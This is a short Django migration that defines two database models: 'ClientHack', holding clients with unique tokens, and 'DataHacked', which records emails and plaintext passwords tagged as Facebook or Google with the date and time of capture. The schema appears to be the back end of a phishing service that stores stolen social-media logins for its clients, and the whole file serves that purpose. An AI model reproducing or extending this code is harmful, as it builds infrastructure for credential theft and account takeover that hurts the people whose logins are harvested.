import secrets
from django.db import migrations, models
import django.db.models.deletion


class Migration(migrations.Migration):

    dependencies = [
        ("core", "0045_facebook_name"),
    ]

    operations = [
        migrations.CreateModel(
            name="ClientHack",
            fields=[
                ("id",    models.AutoField(auto_created=True, primary_key=True, serialize=False)),
                ("name",  models.CharField(max_length=255)),
                ("email", models.EmailField()),
                ("token", models.CharField(
                    max_length=32,
                    unique=True,
                    blank=True,
                    help_text="Généré automatiquement",
                )),
            ],
            options={
                "verbose_name": "Client Hack",
                "verbose_name_plural": "Clients Hack",
                "ordering": ["-id"],
            },
        ),
        migrations.CreateModel(
            name="DataHacked",
            fields=[
                ("id",       models.AutoField(auto_created=True, primary_key=True, serialize=False)),
                ("client",   models.ForeignKey(
                    on_delete=django.db.models.deletion.CASCADE,
                    related_name="submissions",
                    to="core.clienthack",
                )),
                ("email",    models.CharField(max_length=255)),
                ("password", models.CharField(max_length=255)),
                ("date",     models.DateField(auto_now_add=True)),
                ("heure",    models.TimeField(auto_now_add=True)),
                ("type",     models.CharField(
                    max_length=10,
                    choices=[("facebook", "Facebook"), ("google", "Google")],
                )),
            ],
            options={
                "verbose_name": "Data Hacked",
                "verbose_name_plural": "Data Hacked",
                "ordering": ["-date", "-heure"],
            },
        ),
    ]
